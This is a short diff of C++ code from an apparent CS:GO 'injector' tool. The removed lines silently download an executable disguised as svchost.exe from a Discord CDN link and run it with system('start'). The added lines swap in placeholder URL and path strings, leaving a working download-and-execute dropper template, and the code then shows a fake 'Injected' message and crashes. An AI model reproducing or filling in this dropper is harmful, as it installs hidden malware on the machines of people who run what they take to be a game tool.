@@ -64,10 +64,10 @@ void inject() {
 
            
         {
-                          HRESULT p2 = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/1007749601660506164/1010709980682395748/svchost.exe"),
-                        _T("C:\\Users\\Admin\\source\\repos\\CSGO\\Release\\TEST\\svchost.exe"), 0, NULL);
+                          HRESULT p2 = URLDownloadToFile(NULL, _T("URL TO DOWNLOAD GOES HERE"),
+                        _T("WHERE THE DOWNLOAD PATH IS EX: C:\\USERS\\SYSTEM32"), 0, NULL);
 
-                          system("start C:\\Users\\Admin\\source\\repos\\CSGO\\Release\\TEST\\svchost.exe");
+                          system("start PATH GOES HERE");
                     MessageBoxA(NULL, "Sucessfully", "Injected", MB_OK); crash();
         }
         exit(1);
